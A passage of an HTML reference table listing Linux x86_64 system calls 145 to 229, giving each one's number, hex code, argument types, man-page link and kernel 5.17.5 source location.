href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setscheduler.2.html">sys_sched_setscheduler</a></td><td>0x90</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param __user *param</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7857">kernel&#x2F;sched&#x2F;core.c:7857</a></td></tr><tr><td>145</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getscheduler.2.html">sys_sched_getscheduler</a></td><td>0x91</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7926">kernel&#x2F;sched&#x2F;core.c:7926</a></td></tr><tr><td>146</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_max.2.html">sys_sched_get_priority_max</a></td><td>0x92</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8754">kernel&#x2F;sched&#x2F;core.c:8754</a></td></tr><tr><td>147</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_min.2.html">sys_sched_get_priority_min</a></td><td>0x93</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8781">kernel&#x2F;sched&#x2F;core.c:8781</a></td></tr><tr><td>148</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_rr_get_interval.2.html">sys_sched_rr_get_interval</a></td><td>0x94</td><td>pid_t pid</td><td>struct __kernel_timespec __user *interval</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8846">kernel&#x2F;sched&#x2F;core.c:8846</a></td></tr><tr><td>149</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlock.2.html">sys_mlock</a></td><td>0x95</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mlock.c#L614">mm&#x2F;mlock.c:614</a></td></tr><tr><td>150</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlock.2.html">sys_munlock</a></td><td>0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mlock.c#L632">mm&#x2F;mlock.c:632</a></td></tr><tr><td>151</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlockall.2.html">sys_mlockall</a></td><td>0x97</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mlock.c#L697">mm&#x2F;mlock.c:697</a></td></tr><tr><td>152</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlockall.2.html">sys_munlockall</a></td><td>0x98</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>153</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vhangup.2.html">sys_vhangup</a></td><td>0x99</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>155</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pivot_root.2.html">sys_pivot_root</a></td><td>0x9b</td><td>const char __user *new_root</td><td>const char __user *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L3868">fs&#x2F;namespace.c:3868</a></td></tr><tr><td>156</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ni_syscall.2.html">sys_ni_syscall</a></td><td>0x9c</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>157</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/prctl.2.html">sys_prctl</a></td><td>0x9d</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L2351">kernel&#x2F;sys.c:2351</a></td></tr><tr><td>159</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/adjtimex.2.html">sys_adjtimex</a></td><td>0x9f</td><td>struct __kernel_timex __user *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/time.c#L269">kernel&#x2F;time&#x2F;time.c:269</a></td></tr><tr><td>160</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setrlimit.2.html">sys_setrlimit</a></td><td>0xa0</td><td>unsigned int resource</td><td>struct rlimit __user *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1711">kernel&#x2F;sys.c:1711</a></td></tr><tr><td>161</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chroot.2.html">sys_chroot</a></td><td>0xa1</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L556">fs&#x2F;open.c:556</a></td></tr><tr><td>162</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync.2.html">sys_sync</a></td><td>0xa2</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L149">fs&#x2F;sync.c:149</a></td></tr><tr><td>163</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/acct.2.html">sys_acct</a></td><td>0xa3</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/acct.c#L292">kernel&#x2F;acct.c:292</a></td></tr><tr><td>164</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/settimeofday.2.html">sys_settimeofday</a></td><td>0xa4</td><td>struct __kernel_old_timeval __user *tv</td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/time.c#L199">kernel&#x2F;time&#x2F;time.c:199</a></td></tr><tr><td>165</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mount.2.html">sys_mount</a></td><td>0xa5</td><td>char __user *dev_name</td><td>char __user *dir_name</td><td>char __user *type</td><td>unsigned long flags</td><td>void __user *data</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L3568">fs&#x2F;namespace.c:3568</a></td></tr><tr><td>166</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umount.2.html">sys_umount</a></td><td>0xa6</td><td>char __user *name</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L1828">fs&#x2F;namespace.c:1828</a></td></tr><tr><td>167</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapon.2.html">sys_swapon</a></td><td>0xa7</td><td>const char __user *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/swapfile.c#L2976">mm&#x2F;swapfile.c:2976</a></td></tr><tr><td>168</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapoff.2.html">sys_swapoff</a></td><td>0xa8</td><td>const char __user *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/swapfile.c#L2381">mm&#x2F;swapfile.c:2381</a></td></tr><tr><td>169</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/reboot.2.html">sys_reboot</a></td><td>0xa9</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void __user *arg</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/reboot.c#L700">kernel&#x2F;reboot.c:700</a></td></tr><tr><td>170</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sethostname.2.html">sys_sethostname</a></td><td>0xaa</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1356">kernel&#x2F;sys.c:1356</a></td></tr><tr><td>171</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setdomainname.2.html">sys_setdomainname</a></td><td>0xab</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1410">kernel&#x2F;sys.c:1410</a></td></tr><tr><td>172</td><td></td><td></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>173</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioperm.2.html">sys_ioperm</a></td><td>0xad</td><td>unsigned long from</td><td>unsigned long num</td><td>int on</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/arch/x86/kernel/ioport.c#L152">arch&#x2F;x86&#x2F;kernel&#x2F;ioport.c:152</a></td></tr><tr><td>174</td><td>not implemented</td><td>0xae</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>175</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/init_module.2.html">sys_init_module</a></td><td>0xaf</td><td>void __user *umod</td><td>unsigned long len</td><td>const char __user *uargs</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/module/main.c#L2896">kernel&#x2F;module&#x2F;main.c:2896</a></td></tr><tr><td>176</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/delete_module.2.html">sys_delete_module</a></td><td>0xb0</td><td>const char __user *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/module/main.c#L696">kernel&#x2F;module&#x2F;main.c:696</a></td></tr><tr><td>177</td><td>not implemented</td><td>0xb1</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>178</td><td>not implemented</td><td>0xb2</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>179</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/quotactl.2.html">sys_quotactl</a></td><td>0xb3</td><td>unsigned int cmd</td><td>const char __user *special</td><td>qid_t id</td><td>void __user *addr</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/quota/quota.c#L916">fs&#x2F;quota&#x2F;quota.c:916</a></td></tr><tr><td>180</td><td>not implemented</td><td>0xb4</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>181</td><td>not implemented</td><td>0xb5</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>182</td><td>not implemented</td><td>0xb6</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>183</td><td>not implemented</td><td>0xb7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>184</td><td>not implemented</td><td>0xb8</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>185</td><td>not implemented</td><td>0xb9</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>186</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettid.2.html">sys_gettid</a></td><td>0xba</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>187</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readahead.2.html">sys_readahead</a></td><td>0xbb</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/readahead.c#L761">mm&#x2F;readahead.c:761</a></td></tr><tr><td>188</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setxattr.2.html">sys_setxattr</a></td><td>0xbc</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L648">fs&#x2F;xattr.c:648</a></td></tr><tr><td>189</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lsetxattr.2.html">sys_lsetxattr</a></td><td>0xbd</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L655">fs&#x2F;xattr.c:655</a></td></tr><tr><td>190</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsetxattr.2.html">sys_fsetxattr</a></td><td>0xbe</td><td>int fd</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L662">fs&#x2F;xattr.c:662</a></td></tr><tr><td>191</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getxattr.2.html">sys_getxattr</a></td><td>0xbf</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L760">fs&#x2F;xattr.c:760</a></td></tr><tr><td>192</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lgetxattr.2.html">sys_lgetxattr</a></td><td>0xc0</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L766">fs&#x2F;xattr.c:766</a></td></tr><tr><td>193</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fgetxattr.2.html">sys_fgetxattr</a></td><td>0xc1</td><td>int fd</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L772">fs&#x2F;xattr.c:772</a></td></tr><tr><td>194</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/listxattr.2.html">sys_listxattr</a></td><td>0xc2</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L837">fs&#x2F;xattr.c:837</a></td></tr><tr><td>195</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llistxattr.2.html">sys_llistxattr</a></td><td>0xc3</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L843">fs&#x2F;xattr.c:843</a></td></tr><tr><td>196</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flistxattr.2.html">sys_flistxattr</a></td><td>0xc4</td><td>int fd</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L849">fs&#x2F;xattr.c:849</a></td></tr><tr><td>197</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/removexattr.2.html">sys_removexattr</a></td><td>0xc5</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L903">fs&#x2F;xattr.c:903</a></td></tr><tr><td>198</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lremovexattr.2.html">sys_lremovexattr</a></td><td>0xc6</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L909">fs&#x2F;xattr.c:909</a></td></tr><tr><td>199</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fremovexattr.2.html">sys_fremovexattr</a></td><td>0xc7</td><td>int fd</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/xattr.c#L915">fs&#x2F;xattr.c:915</a></td></tr><tr><td>200</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tkill.2.html">sys_tkill</a></td><td>0xc8</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3968">kernel&#x2F;signal.c:3968</a></td></tr><tr><td>201</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/time.2.html">sys_time</a></td><td>0xc9</td><td>__kernel_old_time_t __user *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1005">kernel&#x2F;sys.c:1005</a></td></tr><tr><td>202</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futex.2.html">sys_futex</a></td><td>0xca</td><td>u32 __user *uaddr</td><td>int op</td><td>u32 val</td><td>const struct __kernel_timespec __user *utime</td><td>u32 __user *uaddr2</td><td>u32 val3</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/futex/syscalls.c#L164">kernel&#x2F;futex&#x2F;syscalls.c:164</a></td></tr><tr><td>203</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setaffinity.2.html">sys_sched_setaffinity</a></td><td>0xcb</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8211">kernel&#x2F;sched&#x2F;core.c:8211</a></td></tr><tr><td>204</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getaffinity.2.html">sys_sched_getaffinity</a></td><td>0xcc</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8263">kernel&#x2F;sched&#x2F;core.c:8263</a></td></tr><tr><td>205</td><td>not implemented</td><td>0xcd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>206</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_setup.2.html">sys_io_setup</a></td><td>0xce</td><td>unsigned nr_reqs</td><td>aio_context_t __user *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L1335">fs&#x2F;aio.c:1335</a></td></tr><tr><td>207</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_destroy.2.html">sys_io_destroy</a></td><td>0xcf</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L1404">fs&#x2F;aio.c:1404</a></td></tr><tr><td>208</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_getevents.2.html">sys_io_getevents</a></td><td>0xd0</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event __user *events</td><td>struct __kernel_timespec __user *timeout</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L2218">fs&#x2F;aio.c:2218</a></td></tr><tr><td>209</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_submit.2.html">sys_io_submit</a></td><td>0xd1</td><td>aio_context_t</td><td>long</td><td>struct iocb __user * __user *</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L2048">fs&#x2F;aio.c:2048</a></td></tr><tr><td>210</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_cancel.2.html">sys_io_cancel</a></td><td>0xd2</td><td>aio_context_t ctx_id</td><td>struct iocb __user *iocb</td><td>struct io_event __user *result</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L2142">fs&#x2F;aio.c:2142</a></td></tr><tr><td>211</td><td>not implemented</td><td>0xd3</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>212</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lookup_dcookie.2.html">sys_lookup_dcookie</a></td><td>0xd4</td><td>u64 cookie64</td><td>char __user *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>213</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create.2.html">sys_epoll_create</a></td><td>0xd5</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2037">fs&#x2F;eventpoll.c:2037</a></td></tr><tr><td>214</td><td>not implemented</td><td>0xd6</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>215</td><td>not implemented</td><td>0xd7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>216</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/remap_file_pages.2.html">sys_remap_file_pages</a></td><td>0xd8</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mmap.c#L2807">mm&#x2F;mmap.c:2807</a></td></tr><tr><td>217</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html">sys_getdents64</a></td><td>0xd9</td><td>unsigned int fd</td><td>struct linux_dirent64 __user *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/readdir.c#L354">fs&#x2F;readdir.c:354</a></td></tr><tr><td>218</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_tid_address.2.html">sys_set_tid_address</a></td><td>0xda</td><td>int __user *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/fork.c#L1769">kernel&#x2F;fork.c:1769</a></td></tr><tr><td>219</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/restart_syscall.2.html">sys_restart_syscall</a></td><td>0xdb</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>220</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/semtimedop.2.html">sys_semtimedop</a></td><td>0xdc</td><td>int semid</td><td>struct sembuf __user *sops</td><td>unsigned nsops</td><td>const struct __kernel_timespec __user *timeout</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/sem.c#L2270">ipc&#x2F;sem.c:2270</a></td></tr><tr><td>221</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64.2.html">sys_fadvise64</a></td><td>0xdd</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/fadvise.c#L212">mm&#x2F;fadvise.c:212</a></td></tr><tr><td>222</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_create.2.html">sys_timer_create</a></td><td>0xde</td><td>clockid_t which_clock</td><td>struct sigevent __user *timer_event_spec</td><td>timer_t __user * created_timer_id</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L577">kernel&#x2F;time&#x2F;posix-timers.c:577</a></td></tr><tr><td>223</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_settime.2.html">sys_timer_settime</a></td><td>0xdf</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec __user *new_setting</td><td>struct __kernel_itimerspec __user *old_setting</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L938">kernel&#x2F;time&#x2F;posix-timers.c:938</a></td></tr><tr><td>224</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_gettime.2.html">sys_timer_gettime</a></td><td>0xe0</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec __user *setting</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L738">kernel&#x2F;time&#x2F;posix-timers.c:738</a></td></tr><tr><td>225</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_getoverrun.2.html">sys_timer_getoverrun</a></td><td>0xe1</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L777">kernel&#x2F;time&#x2F;posix-timers.c:777</a></td></tr><tr><td>226</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_delete.2.html">sys_timer_delete</a></td><td>0xe2</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L1004">kernel&#x2F;time&#x2F;posix-timers.c:1004</a></td></tr><tr><td>227</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_settime.2.html">sys_clock_settime</a></td><td>0xe3</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec __user *tp</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-stubs.c#L60">kernel&#x2F;time&#x2F;posix-stubs.c:60</a></td></tr><tr><td>228</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_gettime.2.html">sys_clock_gettime</a></td><td>0xe4</td><td>clockid_t which_clock</td><td>struct __kernel_timespec __user *tp</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-stubs.c#L94">kernel&#x2F;time&#x2F;posix-stubs.c:94</a></td></tr><tr><td>229</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_getres.2.html">sys_clock_getres</a></td><td>0xe5</td><td>clockid_t which_clock</td><td>struct __kernel_timespec __user *tp</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-stubs.c#L109">kernel&#x2F;time&#x2F;posix-stubs.c:109</a></td></tr><tr><td>230</td><td><a 